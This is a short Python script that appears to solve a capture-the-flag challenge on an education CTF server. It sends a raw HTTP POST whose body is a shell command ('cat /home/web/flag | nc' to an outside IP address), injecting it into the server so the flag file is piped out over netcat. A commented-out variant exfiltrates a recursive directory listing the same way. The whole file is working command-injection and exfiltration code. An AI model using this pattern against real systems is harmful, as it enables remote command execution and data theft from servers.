import socket

# Define the server address and port
server_address = ('edu-ctf.csie.org', 54321)
#server_address = ('127.0.0.1', 54321)
# Define the HTTP POST request

#cmd = 'ls -lR | nc 140.113.235.151 10001'
cmd = 'cat /home/web/flag | nc 140.113.235.151 10001'

post_data = 'POST / HTTP/1.1\r\n' \
            'Host: example.com\r\n' \
            'Content-Type: text/plain\r\n' \
            f'Content-Length: {len(cmd)}\r\n\r\n' \
            f'{cmd}'

# Create a TCP socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client_socket.connect(server_address)

# Send the HTTP POST request
client_socket.sendall(post_data.encode('utf-8'))

# Receive and print the response data
while True:
    response = client_socket.recv(4096)
    #if not response:
    #    break
    print(response.decode('utf-8'))

# Close the socket
client_socket.close()
